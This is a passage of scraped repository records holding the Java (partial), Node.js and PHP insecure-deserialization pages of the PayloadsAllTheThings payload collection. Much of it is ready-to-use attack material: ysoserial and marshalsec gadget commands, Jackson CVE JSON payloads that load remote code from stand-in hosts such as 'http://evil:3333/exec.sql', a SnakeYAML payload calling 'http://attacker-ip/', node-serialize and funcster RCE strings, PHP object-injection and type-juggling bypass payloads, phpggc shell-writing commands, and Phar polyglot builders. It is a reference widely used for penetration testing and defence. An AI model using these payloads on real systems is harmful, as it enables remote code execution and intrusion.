|\n| Click1              | @artsploit                             | click-nodeps:2.3.0, javax.servlet-api:3.1.0 |\n| Clojure             | @JackOfMostTrades                      | clojure:1.8.0 |\n| CommonsBeanutils1   | @frohoff                               | commons-beanutils:1.9.2, commons-collections:3.1, commons-logging:1.2 |\n| CommonsCollections1 | @frohoff                               | commons-collections:3.1 |\n| CommonsCollections2 | @frohoff                               | commons-collections4:4.0 |\n| CommonsCollections3 | @frohoff                               | commons-collections:3.1 |\n| CommonsCollections4 | @frohoff                               | commons-collections4:4.0 |\n| CommonsCollections5 | @matthias_kaiser, @jasinner            | commons-collections:3.1  |\n| CommonsCollections6 | @matthias_kaiser                       | commons-collections:3.1  |\n| CommonsCollections7 | @scristalli, @hanyrax, @EdoardoVignati | commons-collections:3.1  |\n| FileUpload1         | @mbechler                              | commons-fileupload:1.3.1, commons-io:2.4|\n| Groovy1             | @frohoff                               | groovy:2.3.9            |\n| Hibernate1          | @mbechler                              | |\n| Hibernate2          | @mbechler                              | |\n| JBossInterceptors1  | @matthias_kaiser                       | javassist:3.12.1.GA, jboss-interceptor-core:2.0.0.Final, cdi-api:1.0-SP1, javax.interceptor-api:3.1, jboss-interceptor-spi:2.0.0.Final, slf4j-api:1.7.21 |\n| JRMPClient          | @mbechler                              | |\n| JRMPListener        | @mbechler                              | |\n| JSON1               | @mbechler                              | json-lib:jar:jdk15:2.4, spring-aop:4.1.4.RELEASE, aopalliance:1.0, commons-logging:1.2, commons-lang:2.6, ezmorph:1.0.6, commons-beanutils:1.9.2, spring-core:4.1.4.RELEASE, commons-collections:3.1 |\n| JavassistWeld1      | @matthias_kaiser                       | javassist:3.12.1.GA, weld-core:1.1.33.Final, cdi-api:1.0-SP1, javax.interceptor-api:3.1, jboss-interceptor-spi:2.0.0.Final, slf4j-api:1.7.21 |\n| Jdk7u21             | @frohoff                               | |\n| Jython1             | @pwntester, @cschneider4711            | jython-standalone:2.5.2 |\n| MozillaRhino1       | @matthias_kaiser                       | js:1.7R2 |\n| MozillaRhino2       | @_tint0                                | js:1.7R2 |\n| Myfaces1            | @mbechler                              | |\n| Myfaces2            | @mbechler                              | |\n| ROME                | @mbechler                              | rome:1.0 |\n| Spring1             | @frohoff                               | spring-core:4.1.4.RELEASE, spring-beans:4.1.4.RELEASE |\n| Spring2             | @mbechler                              | spring-core:4.1.4.RELEASE, spring-aop:4.1.4.RELEASE, aopalliance:1.0, commons-logging:1.2 |\n| URLDNS              | @gebl                                  | |\n| Vaadin1             | @kai_ullrich                           | vaadin-server:7.7.14, vaadin-shared:7.7.14 |\n| Wicket1             | @jacob-baines                          | wicket-util:6.23.0, slf4j-api:1.6.4 |\n\n### Burp extensions\n\n* [NetSPI/JavaSerialKiller](https://github.com/NetSPI/JavaSerialKiller) -  Burp extension to perform Java Deserialization Attacks\n* [federicodotta/Java Deserialization Scanner](https://github.com/federicodotta/Java-Deserialization-Scanner) -  All-in-one plugin for Burp Suite for the detection and the exploitation of Java deserialization vulnerabilities\n* [summitt/burp-ysoserial](https://github.com/summitt/burp-ysoserial) -  YSOSERIAL Integration with Burp Suite\n* [DirectDefense/SuperSerial](https://github.com/DirectDefense/SuperSerial) - Burp Java Deserialization Vulnerability Identification\n* [DirectDefense/SuperSerial-Active](https://github.com/DirectDefense/SuperSerial-Active) - Java Deserialization Vulnerability Active Identification Burp Extender\n\n### Alternative Tooling\n\n* [pwntester/JRE8u20_RCE_Gadget](https://github.com/pwntester/JRE8u20_RCE_Gadget) - Pure JRE 8 RCE Deserialization gadget\n* [joaomatosf/JexBoss](https://github.com/joaomatosf/jexboss) - JBoss (and others Java Deserialization Vulnerabilities) verify and EXploitation Tool\n* [pimps/ysoserial-modified](https://github.com/pimps/ysoserial-modified) - A fork of the original ysoserial application\n* [NickstaDB/SerialBrute](https://github.com/NickstaDB/SerialBrute) - Java serialization brute force attack tool\n* [NickstaDB/SerializationDumper](https://github.com/NickstaDB/SerializationDumper) - A tool to dump Java serialization streams in a more human readable form\n* [bishopfox/gadgetprobe](https://labs.bishopfox.com/gadgetprobe) - Exploiting Deserialization to Brute-Force the Remote Classpath\n* [k3idii/Deserek](https://github.com/k3idii/Deserek) - Python code to Serialize and Unserialize java binary serialization format.\n\n  ```java\n  java -jar ysoserial.jar URLDNS http://xx.yy > yss_base.bin\n  python deserek.py yss_base.bin --format python > yss_url.py\n  python yss_url.py yss_new.bin\n  java -cp JavaSerializationTestSuite DeSerial yss_new.bin\n  ```\n\n* [mbechler/marshalsec](https://github.com/mbechler/marshalsec) - Java Unmarshaller Security - Turning your data into code execution\n\n  ```java\n  $ java -cp marshalsec.jar marshalsec.<Marshaller> [-a] [-v] [-t] [<gadget_type> [<arguments...>]]\n  $ java -cp marshalsec.jar marshalsec.JsonIO Groovy \"cmd\" \"/c\" \"calc\"\n  $ java -cp marshalsec.jar marshalsec.jndi.LDAPRefServer http://localhost:8000\\#exploit.JNDIExploit 1389\n  // -a - generates/tests all payloads for that marshaller\n  // -t - runs in test mode, unmarshalling the generated payloads after generating them.\n  // -v - verbose mode, e.g. also shows the generated payload in test mode.\n  // gadget_type - Identifier of a specific gadget, if left out will display the available ones for that specific marshaller.\n  // arguments - Gadget specific arguments\n  ```\n\nPayload generators for the following marshallers are included:\n\n| Marshaller                      | Gadget Impact                                |\n| ------------------------------- | ---------------------------------------------- |\n| BlazeDSAMF(0&#124;3&#124;X)     | JDK only escalation to Java serialization various third party libraries RCEs |\n| Hessian&#124;Burlap             | various third party RCEs |\n| Castor                          | dependency library RCE |\n| Jackson                         | **possible JDK only RCE**, various third party RCEs |\n| Java                            | yet another third party RCE |\n| JsonIO                          | **JDK only RCE** |\n| JYAML                           | **JDK only RCE** |\n| Kryo                            | third party RCEs |\n| KryoAltStrategy                 | **JDK only RCE** |\n| Red5AMF(0&#124;3)               | **JDK only RCE** |\n| SnakeYAML                       | **JDK only RCEs** |\n| XStream                         | **JDK only RCEs** |\n| YAMLBeans                       | third party RCE |\n\n## JSON Deserialization\n\nMultiple libraries can be used to handle JSON in Java.\n\n* [json-io](https://github.com/GrrrDog/Java-Deserialization-Cheat-Sheet#json-io-json)\n* [Jackson](https://github.com/GrrrDog/Java-Deserialization-Cheat-Sheet#jackson-json)\n* [Fastjson](https://github.com/GrrrDog/Java-Deserialization-Cheat-Sheet#fastjson-json)\n* [Genson](https://github.com/GrrrDog/Java-Deserialization-Cheat-Sheet#genson-json)\n* [Flexjson](https://github.com/GrrrDog/Java-Deserialization-Cheat-Sheet#flexjson-json)\n* [Jodd](https://github.com/GrrrDog/Java-Deserialization-Cheat-Sheet#jodd-json)\n\n**Jackson**:\n\nJackson is a popular Java library used for working with JSON (JavaScript Object Notation) data.\nJackson-databind supports Polymorphic Type Handling (PTH), formerly known as \"Polymorphic Deserialization\", which is disabled by default.\n\nTo determine if the backend is using Jackson, the most common technique is to send an invalid JSON and inspect the error message. Look for references to either of those:\n\n```java\nValidation failed: Unhandled Java exception: com.fasterxml.jackson.databind.exc.MismatchedInputException: Unexpected token (START_OBJECT), expected START_ARRAY: need JSON Array to contain As.WRAPPER_ARRAY type information for class java.lang.Object\n```\n\n* com.fasterxml.jackson.databind\n* org.codehaus.jackson.map\n\n**Exploitation**:\n\n* **CVE-2017-7525**\n\n  ```json\n  {\n    \"param\": [\n      \"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\",\n      {\n        \"transletBytecodes\": [\n          \"yv66v[JAVA_CLASS_B64_ENCODED]AIAEw==\"\n        ],\n        \"transletName\": \"a.b\",\n        \"outputProperties\": {}\n      }\n    ]\n  }\n    ```\n\n* **CVE-2017-17485**\n\n  ```json\n  {\n    \"param\": [\n      \"org.springframework.context.support.FileSystemXmlApplicationContext\",\n      \"http://evil/spel.xml\"\n    ]\n  }\n  ```\n\n* **CVE-2019-12384**\n\n  ```json\n  [\n    \"ch.qos.logback.core.db.DriverManagerConnectionSource\", \n    {\n      \"url\":\"jdbc:h2:mem:;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM 'http://localhost:8000/inject.sql'\"\n    }\n  ]\n  ```\n\n* **CVE-2020-36180**\n\n  ```json\n  [\n    \"org.apache.commons.dbcp2.cpdsadapter.DriverAdapterCPDS\",\n    {\n      \"url\":\"jdbc:h2:mem:;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM 'http://evil:3333/exec.sql'\"\n    }\n  ]\n  ```\n\n* **CVE-2020-9548**\n\n    ```json\n    [\n      \"br.com.anteros.dbcp.AnterosDBCPConfig\",\n      {\n        \"healthCheckRegistry\": \"ldap://{{interactsh-url}}\"\n      }\n    ]\n    ```\n\n## YAML Deserialization\n\n* [SnakeYAML](https://github.com/GrrrDog/Java-Deserialization-Cheat-Sheet#snakeyaml-yaml)\n* [jYAML](https://github.com/GrrrDog/Java-Deserialization-Cheat-Sheet#jyaml-yaml)\n* [YamlBeans](https://github.com/GrrrDog/Java-Deserialization-Cheat-Sheet#yamlbeans-yaml)\n\n**SnakeYAML**:\n\nSnakeYAML is a popular Java-based library used for parsing and emitting YAML (YAML Ain't Markup Language) data. It provides an easy-to-use API for working with YAML, a human-readable data serialization standard commonly used for configuration files and data exchange.\n\n```yaml\n!!javax.script.ScriptEngineManager [\n  !!java.net.URLClassLoader [[\n    !!java.net.URL [\"http://attacker-ip/\"]\n  ]]\n]\n```\n\n## ViewState\n\nIn Java, ViewState refers to the mechanism used by frameworks like JavaServer Faces (JSF) to maintain the state of UI components between HTTP requests in web applications. There are 2 major implementations:\n\n* Oracle Mojarra (JSF reference implementation)\n* Apache MyFaces\n\n**Tools**:\n\n* [joaomatosf/jexboss](https://github.com/joaomatosf/jexboss) - JexBoss: Jboss (and Java Deserialization Vulnerabilities) verify and EXploitation Tool\n* [Synacktiv-contrib/inyourface](https://github.com/Synacktiv-contrib/inyourface) - InYourFace is a software used to patch unencrypted and unsigned JSF ViewStates.\n\n### Encoding\n\n| Encoding      | Starts with |\n| ------------- | ----------- |\n| base64        | `rO0`       |\n| base64 + gzip | `H4sIAAA`   |\n\n### Storage\n\nThe `javax.faces.STATE_SAVING_METHOD` is a configuration parameter in JavaServer Faces (JSF). It specifies how the framework should save the state of a component tree (the structure and data of UI components on a page) between HTTP requests.\n\nThe storage method can also be inferred from the viewstate representation in the HTML body.\n\n* **Server side** storage: `value=\"-XXX:-XXXX\"`\n* **Client side** storage: `base64 + gzip + Java Object`\n\n### Encryption\n\nBy default MyFaces uses DES as encryption algorithm and HMAC-SHA1 to authenticate the ViewState. It is possible and recommended to configure more recent algorithms like AES and HMAC-SHA256.\n\n| Encryption Algorithm | HMAC        |\n| -------------------- | ----------- |\n| DES ECB (default)    | HMAC-SHA1   |\n\nSupported encryption methods are BlowFish, 3DES, AES and are defined by a context parameter.\nThe value of these parameters and their secrets can be found inside these XML clauses.\n\n```xml\n<param-name>org.apache.myfaces.MAC_ALGORITHM</param-name>   \n<param-name>org.apache.myfaces.SECRET</param-name>   \n<param-name>org.apache.myfaces.MAC_SECRET</param-name>\n```\n\nCommon secrets from the [documentation](https://cwiki.apache.org/confluence/display/MYFACES2/Secure+Your+Application).\n\n| Name                 | Value                              |\n| -------------------- | ---------------------------------- |\n| AES CBC/PKCS5Padding | `NzY1NDMyMTA3NjU0MzIxMA==`         |\n| DES                  | `NzY1NDMyMTA=<`                    |\n| DESede               | `MDEyMzQ1Njc4OTAxMjM0NTY3ODkwMTIz` |\n| Blowfish             | `NzY1NDMyMTA3NjU0MzIxMA`           |\n| AES CBC              | `MDEyMzQ1Njc4OTAxMjM0NTY3ODkwMTIz` |\n| AES CBC IV           | `NzY1NDMyMTA3NjU0MzIxMA==`         |\n\n* **Encryption**: Data -> encrypt -> hmac_sha1_sign -> b64_encode -> url_encode -> ViewState\n* **Decryption**: ViewState -> url_decode -> b64_decode -> hmac_sha1_unsign -> decrypt -> Data\n\n## References\n\n* [Detecting deserialization bugs with DNS exfiltration - Philippe Arteau - March 22, 2017](https://www.gosecure.net/blog/2017/03/22/detecting-deserialization-bugs-with-dns-exfiltration/)\n* [Exploiting the Jackson RCE: CVE-2017-7525 - Adam Caudill - October 4, 2017](https://adamcaudill.com/2017/10/04/exploiting-jackson-rce-cve-2017-7525/)\n* [Hack The Box - Arkham - 0xRick - August 10, 2019](https://0xrick.github.io/hack-the-box/arkham/)\n* [How I found a $1500 worth Deserialization vulnerability - Ashish Kunwar - August 28, 2018](https://medium.com/@D0rkerDevil/how-i-found-a-1500-worth-deserialization-vulnerability-9ce753416e0a)\n* [Jackson CVE-2019-12384: anatomy of a vulnerability class - Andrea Brancaleoni - July 22, 2019](https://blog.doyensec.com/2019/07/22/jackson-gadgets.html)\n* [Jackson gadgets - Anatomy of a vulnerability - Andrea Brancaleoni - 22 Jul 2019](https://blog.doyensec.com/2019/07/22/jackson-gadgets.html)\n* [Jackson Polymorphic Deserialization - FasterXML - July 23, 2020](https://github.com/FasterXML/jackson-docs/wiki/JacksonPolymorphicDeserialization)\n* [Java Deserialization Cheat Sheet - Aleksei Tiurin - May 23, 2023](https://github.com/GrrrDog/Java-Deserialization-Cheat-Sheet/blob/master/README.md)\n* [Java Deserialization in ViewState - Haboob Team - December 23, 2020](https://www.exploit-db.com/docs/48126)\n* [JSF ViewState upside-down - Renaud Dubourguais, Nicolas Collignon - March 15, 2016](https://www.synacktiv.com/ressources/JSF_ViewState_InYourFace.pdf)\n* [Misconfigured JSF ViewStates can lead to severe RCE vulnerabilities - Peter Stöckli - August 14, 2017](https://www.alphabot.com/security/blog/2017/java/Misconfigured-JSF-ViewStates-can-lead-to-severe-RCE-vulnerabilities.html)\n* [On Jackson CVEs: Don’t Panic — Here is what you need to know - cowtowncoder - December 22, 2017](https://cowtowncoder.medium.com/on-jackson-cves-dont-panic-here-is-what-you-need-to-know-54cd0d6e8062)\n* [Pre-auth RCE in ForgeRock OpenAM (CVE-2021-35464) - Michael Stepankin (@artsploit) - June 29, 2021](https://portswigger.net/research/pre-auth-rce-in-forgerock-openam-cve-2021-35464)\n* [Triggering a DNS lookup using Java Deserialization - paranoidsoftware.com - July 5, 2020](https://blog.paranoidsoftware.com/triggering-a-dns-lookup-using-java-deserialization/)\n* [Understanding & practicing java deserialization exploits - Diablohorn - September 9, 2017](https://diablohorn.com/2017/09/09/understanding-practicing-java-deserialization-exploits/)\n* [Friday the 13th JSON Attacks - Alvaro Muñoz & Oleksandr Mirosh - July 28, 2017](https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-JSON-Attacks-wp.pdf)\n", "timestamp": "2025-10-21T13:30:02.887723"}
{"source": "github", "repo": "swisskyrepo/PayloadsAllTheThings", "file": "Insecure Deserialization/Node.md", "url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Insecure%20Deserialization/Node.md", "content": "# Node Deserialization\n\n> Node.js deserialization refers to the process of reconstructing JavaScript objects from a serialized format, such as JSON, BSON, or other formats that represent structured data. In Node.js applications, serialization and deserialization are commonly used for data storage, caching, and inter-process communication.\n\n## Summary\n\n* [Methodology](#methodology)\n    * [node-serialize](#node-serialize)\n    * [funcster](#funcster)\n* [References](#references)\n\n## Methodology\n\n* In Node source code, look for:\n\n    * `node-serialize`\n    * `serialize-to-js`\n    * `funcster`\n\n### node-serialize\n\n> An issue was discovered in the node-serialize package 0.0.4 for Node.js. Untrusted data passed into the `unserialize()` function can be exploited to achieve arbitrary code execution by passing a JavaScript Object with an Immediately Invoked Function Expression (IIFE).\n\n1. Generate a serialized payload\n\n    ```js\n    var y = {\n        rce : function(){\n            require('child_process').exec('ls /', function(error,\n            stdout, stderr) { console.log(stdout) });\n        },\n    }\n    var serialize = require('node-serialize');\n    console.log(\"Serialized: \\n\" + serialize.serialize(y));\n    ```\n\n2. Add bracket `()` to force the execution\n\n    ```js\n    {\"rce\":\"_$$ND_FUNC$$_function(){require('child_process').exec('ls /', function(error,stdout, stderr) { console.log(stdout) });}()\"}\n    ```\n\n3. Send the payload\n\n### funcster\n\n```js\n{\"rce\":{\"__js_function\":\"function(){CMD=\\\"cmd /c calc\\\";const process = this.constructor.constructor('return this.process')();process.mainModule.require('child_process').exec(CMD,function(error,stdout,stderr){console.log(stdout)});}()\"}}\n```\n\n## References\n\n* [CVE-2017-5941 - National Vulnerability Database - February 9, 2017](https://nvd.nist.gov/vuln/detail/CVE-2017-5941)\n* [Exploiting Node.js deserialization bug for Remote Code Execution (CVE-2017-5941) - Ajin Abraham - October 31, 2018](https://www.exploit-db.com/docs/english/41289-exploiting-node.js-deserialization-bug-for-remote-code-execution.pdf)\n* [NodeJS Deserialization - gonczor - January 8, 2020](https://blacksheephacks.pl/nodejs-deserialization/)\n", "timestamp": "2025-10-21T13:30:02.956523"}
{"source": "github", "repo": "swisskyrepo/PayloadsAllTheThings", "file": "Insecure Deserialization/PHP.md", "url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Insecure%20Deserialization/PHP.md", "content": "# PHP Deserialization\n\n> PHP Object Injection is an application level vulnerability that could allow an attacker to perform different kinds of malicious attacks, such as Code Injection, SQL Injection, Path Traversal and Application Denial of Service, depending on the context. The vulnerability occurs when user-supplied input is not properly sanitized before being passed to the unserialize() PHP function. Since PHP allows object serialization, attackers could pass ad-hoc serialized strings to a vulnerable unserialize() call, resulting in an arbitrary PHP object(s) injection into the application scope.\n\n## Summary\n\n* [General Concept](#general-concept)\n* [Authentication Bypass](#authentication-bypass)\n* [Object Injection](#object-injection)\n* [Finding and Using Gadgets](#finding-and-using-gadgets)\n* [Phar Deserialization](#phar-deserialization)\n* [Real World Examples](#real-world-examples)\n* [References](#references)\n\n## General Concept\n\nThe following magic methods will help you for a PHP Object injection\n\n* `__wakeup()` when an object is unserialized.\n* `__destruct()` when an object is deleted.\n* `__toString()` when an object is converted to a string.\n\nAlso you should check the `Wrapper Phar://` in [File Inclusion](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion#wrapper-phar) which use a PHP object injection.\n\nVulnerable code:\n\n```php\n<?php \n    class PHPObjectInjection{\n        public $inject;\n        function __construct(){\n        }\n        function __wakeup(){\n            if(isset($this->inject)){\n                eval($this->inject);\n            }\n        }\n    }\n    if(isset($_REQUEST['r'])){  \n        $var1=unserialize($_REQUEST['r']);\n        if(is_array($var1)){\n            echo \"<br/>\".$var1[0].\" - \".$var1[1];\n        }\n    }\n    else{\n        echo \"\"; # nothing happens here\n    }\n?>\n```\n\nCraft a payload using existing code inside the application.\n\n* Basic serialized data\n\n    ```php\n    a:2:{i:0;s:4:\"XVWA\";i:1;s:33:\"Xtreme Vulnerable Web Application\";}\n    ```\n\n* Command execution\n\n    ```php\n    string(68) \"O:18:\"PHPObjectInjection\":1:{s:6:\"inject\";s:17:\"system('whoami');\";}\"\n    ```\n\n## Authentication Bypass\n\n### Type Juggling\n\nVulnerable code:\n\n```php\n<?php\n$data = unserialize($_COOKIE['auth']);\n\nif ($data['username'] == $adminName && $data['password'] == $adminPassword) {\n    $admin = true;\n} else {\n    $admin = false;\n}\n```\n\nPayload:\n\n```php\na:2:{s:8:\"username\";b:1;s:8:\"password\";b:1;}\n```\n\nBecause `true == \"str\"` is true.\n\n## Object Injection\n\nVulnerable code:\n\n```php\n<?php\nclass ObjectExample\n{\n  var $guess;\n  var $secretCode;\n}\n\n$obj = unserialize($_GET['input']);\n\nif($obj) {\n    $obj->secretCode = rand(500000,999999);\n    if($obj->guess === $obj->secretCode) {\n        echo \"Win\";\n    }\n}\n?>\n```\n\nPayload:\n\n```php\nO:13:\"ObjectExample\":2:{s:10:\"secretCode\";N;s:5:\"guess\";R:2;}\n```\n\nWe can do an array like this:\n\n```php\na:2:{s:10:\"admin_hash\";N;s:4:\"hmac\";R:2;}\n```\n\n## Finding and Using Gadgets\n\nAlso called `\"PHP POP Chains\"`, they can be used to gain RCE on the system.\n\n* In PHP source code, look for `unserialize()` function.\n* Interesting [Magic Methods](https://www.php.net/manual/en/language.oop5.magic.php) such as `__construct()`, `__destruct()`, `__call()`, `__callStatic()`, `__get()`, `__set()`, `__isset()`, `__unset()`, `__sleep()`, `__wakeup()`, `__serialize()`, `__unserialize()`, `__toString()`, `__invoke()`, `__set_state()`, `__clone()`, and `__debugInfo()`:\n    * `__construct()`: PHP allows developers to declare constructor methods for classes. Classes which have a constructor method call this method on each newly-created object, so it is suitable for any initialization that the object may need before it is used. [php.net](https://www.php.net/manual/en/language.oop5.decon.php#object.construct)\n    * `__destruct()`: The destructor method will be called as soon as there are no other references to a particular object, or in any order during the shutdown sequence. [php.net](https://www.php.net/manual/en/language.oop5.decon.php#object.destruct)\n    * `__call(string $name, array $arguments)`: The `$name` argument is the name of the method being called. The `$arguments` argument is an enumerated array containing the parameters passed to the `$name`'ed method. [php.net](https://www.php.net/manual/en/language.oop5.overloading.php#object.call)\n    * `__callStatic(string $name, array $arguments)`: The `$name` argument is the name of the method being called. The `$arguments` argument is an enumerated array containing the parameters passed to the `$name`'ed method. [php.net](https://www.php.net/manual/en/language.oop5.overloading.php#object.callstatic)\n    * `__get(string $name)`: `__get()` is utilized for reading data from inaccessible (protected or private) or non-existing properties. [php.net](https://www.php.net/manual/en/language.oop5.overloading.php#object.get)\n    * `__set(string $name, mixed $value)`: `__set()` is run when writing data to inaccessible (protected or private) or non-existing properties. [php.net](https://www.php.net/manual/en/language.oop5.overloading.php#object.set)\n    * `__isset(string $name)`: `__isset()` is triggered by calling `isset()` or `empty()` on inaccessible (protected or private) or non-existing properties. [php.net](https://www.php.net/manual/en/language.oop5.overloading.php#object.isset)\n    * `__unset(string $name)`: `__unset()` is invoked when `unset()` is used on inaccessible (protected or private) or non-existing properties. [php.net](https://www.php.net/manual/en/language.oop5.overloading.php#object.unset)\n    * `__sleep()`: `serialize()` checks if the class has a function with the magic name `__sleep()`. If so, that function is executed prior to any serialization. It can clean up the object and is supposed to return an array with the names of all variables of that object that should be serialized. If the method doesn't return anything then **null** is serialized and **E_NOTICE** is issued.[php.net](https://www.php.net/manual/en/language.oop5.magic.php#object.sleep)\n    * `__wakeup()`: `unserialize()` checks for the presence of a function with the magic name `__wakeup()`. If present, this function can reconstruct any resources that the object may have. The intended use of `__wakeup()` is to reestablish any database connections that may have been lost during serialization and perform other reinitialization tasks. [php.net](https://www.php.net/manual/en/language.oop5.magic.php#object.wakeup)\n    * `__serialize()`: `serialize()` checks if the class has a function with the magic name `__serialize()`. If so, that function is executed prior to any serialization. It must construct and return an associative array of key/value pairs that represent the serialized form of the object. If no array is returned a TypeError will be thrown. [php.net](https://www.php.net/manual/en/language.oop5.magic.php#object.serialize)\n    * `__unserialize(array $data)`: this function will be passed the restored array that was returned from __serialize().  [php.net](https://www.php.net/manual/en/language.oop5.magic.php#object.unserialize)\n    * `__toString()`: The __toString() method allows a class to decide how it will react when it is treated like a string [php.net](https://www.php.net/manual/en/language.oop5.magic.php#object.tostring)\n    * `__invoke()`: The `__invoke()` method is called when a script tries to call an object as a function. [php.net](https://www.php.net/manual/en/language.oop5.magic.php#object.invoke)\n    * `__set_state(array $properties)`: This static method is called for classes exported by `var_export()`. [php.net](https://www.php.net/manual/en/language.oop5.magic.php#object.set-state)\n    * `__clone()`: Once the cloning is complete, if a `__clone()` method is defined, then the newly created object's `__clone()` method will be called, to allow any necessary properties that need to be changed. [php.net](https://www.php.net/manual/en/language.oop5.cloning.php#object.clone)\n    * `__debugInfo()`: This method is called by `var_dump()` when dumping an object to get the properties that should be shown. If the method isn't defined on an object, then all public, protected and private properties will be shown. [php.net](https://www.php.net/manual/en/language.oop5.magic.php#object.debuginfo)\n\n[ambionics/phpggc](https://github.com/ambionics/phpggc) is a tool built to generate the payload based on several frameworks:\n\n* Laravel\n* Symfony\n* SwiftMailer\n* Monolog\n* SlimPHP\n* Doctrine\n* Guzzle\n\n```powershell\nphpggc monolog/rce1 'phpinfo();' -s\nphpggc monolog/rce1 assert 'phpinfo()'\nphpggc swiftmailer/fw1 /var/www/html/shell.php /tmp/data\nphpggc Monolog/RCE2 system 'id' -p phar -o /tmp/testinfo.ini\n```\n\n## Phar Deserialization\n\nUsing `phar://` wrapper, one can trigger a deserialization on the specified file like in `file_get_contents(\"phar://./archives/app.phar\")`.\n\nA valid PHAR includes four elements:\n\n1. **Stub**: The stub is a chunk of PHP code which is executed when the file is accessed in an executable context. At a minimum, the stub must contain `__HALT_COMPILER();` at its conclusion. Otherwise, there are no restrictions on the contents of a Phar stub.\n2. **Manifest**: Contains metadata about the archive and its contents.\n3. **File Contents**: Contains the actual files in the archive.\n4. **Signature**(optional): For verifying archive integrity.\n\n* Example of a Phar creation in order to exploit a custom `PDFGenerator`.\n\n    ```php\n    <?php\n    class PDFGenerator { }\n\n    //Create a new instance of the Dummy class and modify its property\n    $dummy = new PDFGenerator();\n    $dummy->callback = \"passthru\";\n    $dummy->fileName = \"uname -a > pwned\"; //our payload\n\n    // Delete any existing PHAR archive with that name\n    @unlink(\"poc.phar\");\n\n    // Create a new archive\n    $poc = new Phar(\"poc.phar\");\n\n    // Add all write operations to a buffer, without modifying the archive on disk\n    $poc->startBuffering();\n\n    // Set the stub\n    $poc->setStub(\"<?php echo 'Here is the STUB!'; __HALT_COMPILER();\");\n\n    /* Add a new file in the archive with \"text\" as its content*/\n    $poc[\"file\"] = \"text\";\n    // Add the dummy object to the metadata. This will be serialized\n    $poc->setMetadata($dummy);\n    // Stop buffering and write changes to disk\n    $poc->stopBuffering();\n    ?>\n    ```\n\n* Example of a Phar creation with a `JPEG` magic byte header since there is no restriction on the content of stub.\n\n    ```php\n    <?php\n    class AnyClass {\n        public $data = null;\n        public function __construct($data) {\n            $this->data = $data;\n        }\n        \n        function __destruct() {\n            system($this->data);\n        }\n    }\n\n    // create new Phar\n    $phar = new Phar('test.phar');\n    $phar->startBuffering();\n    $phar->addFromString('test.txt', 'text');\n    $phar->setStub(\"\\xff\\xd8\\xff\\n<?php __HALT_COMPILER(); ?>\");\n\n    // add object of any class as meta data\n    $object = new AnyClass('whoami');\n    $phar->setMetadata($object);\n    $phar->stopBuffering();\n    ```\n\n## Real World Examples\n\n* [Vanilla Forums ImportController index file_exists Unserialize Remote Code Execution Vulnerability - Steven Seeley](https://hackerone.com/reports/410237)\n* [Vanilla Forums Xenforo password splitHash Unserialize Remote Code Execution Vulnerability - Steven Seeley](https://hackerone.com/reports/410212)\n* [Vanilla Forums domGetImages getimagesize Unserialize Remote Code Execution Vulnerability (critical) - Steven Seeley](https://hackerone.com/reports/410882)\n* [Vanilla Forums Gdn_Format unserialize() Remote Code Execution Vulnerability - Steven Seeley](https://hackerone.com/reports/407552)\n\n## References\n\n* [CTF writeup: PHP object injection in kaspersky CTF - Jaimin Gohel - November 24, 2018](https://medium.com/@jaimin_gohel/ctf-writeup-php-object-injection-in-kaspersky-ctf-28a68805610d)\n* [ECSC 2019 Quals Team France - Jack The Ripper Web - noraj - May 22, 2019](https://web.archive.org/web/20211022161400/https://blog.raw.pm/en/ecsc-2019-quals-write-ups/#164-Jack-The-Ripper-Web)\n* [FINDING A POP CHAIN ON A COMMON SYMFONY BUNDLE: PART 1 - Rémi Matasse - September 12, 2023](https://www.synacktiv.com/publications/finding-a-pop-chain-on-a-common-symfony-bundle-part-1)\n* [FINDING A POP CHAIN ON A COMMON SYMFONY BUNDLE: PART 2 - Rémi Matasse - October 11, 2023](https://www.synacktiv.com/publications/finding-a-pop-chain-on-a-common-symfony-bundle-part-2)\n* [Finding PHP Serialization Gadget Chain - DG'hAck Unserial killer - xanhacks - August 11, 2022](https://www.xanhacks.xyz/p/php-gadget-chain/#introduction)\n* [How to exploit the PHAR Deserialization Vulnerability - Alexandru Postolache - May 29, 2020](https://pentest-tools.com/blog/exploit-phar-deserialization-vulnerability/)\n* [phar:// deserialization - HackTricks - July 19, 2024](https://book.hacktricks.xyz/pentesting-web/file-inclusion/phar-deserialization)\n* [PHP deserialization attacks and a new gadget chain in Laravel - Mathieu Farrell - February 13, 2024](https://blog.quarkslab.com/php-deserialization-attacks-and-a-new-gadget-chain-in-laravel.html)\n* [PHP Generic Gadget - Charles Fol - July 4, 2017](https://www.ambionics.io/blog/php-generic-gadget-chains)\n* [PHP Internals Book - Serialization - jpauli - June 15, 2013](http://www.phpinternalsbook.com/classes_objects/serialization.html)\n* [PHP Object Injection - Egidio Romano - April 24, 2020](https://www.owasp.org/index.php/PHP_Object_Injection)\n* [PHP Pop Chains - Achieving RCE with POP chain exploits. - Vickie Li - September 3, 2020](https://vkili.github.io/blog/insecure%20deserialization/pop-chains/)\n* [PHP unserialize - php.net - March 29, 2001](http://php.net/manual/en/function.unserialize.php)\n* [POC2009 Shocking News in PHP Exploitation - Stefan Esser - May 23, 2015](https://web.archive.org/web/20150523205411/https://www.owasp.org/images/f/f6/POC2009-ShockingNewsInPHPExploitation.pdf)\n* [Rusty Joomla RCE Unserialize overflow - Alessandro Groppo - October 3, 2019](https://blog.hacktivesecurity.com/index.php/2019/10/03/rusty-joomla-rce/)\n* [TSULOTT Web challenge write-up - MeePwn CTF - Rawsec - July 15, 2017](https://web.archive.org/web/20211022151328/https://blog.raw.pm/en/meepwn-2017-write-ups/#TSULOTT-Web)\n* [Utilizing Code Reuse/ROP in PHP - Stefan Esser - June 15, 2020](http://web.archive.org/web/20200615044621/https://owasp.org/www-pdf-archive/Utilizing-Code-Reuse-Or-Return-Oriented-Programming-In-PHP-Application-Exploits.pdf)\n", "timestamp": "2025-10-21T13:30:03.025094"}
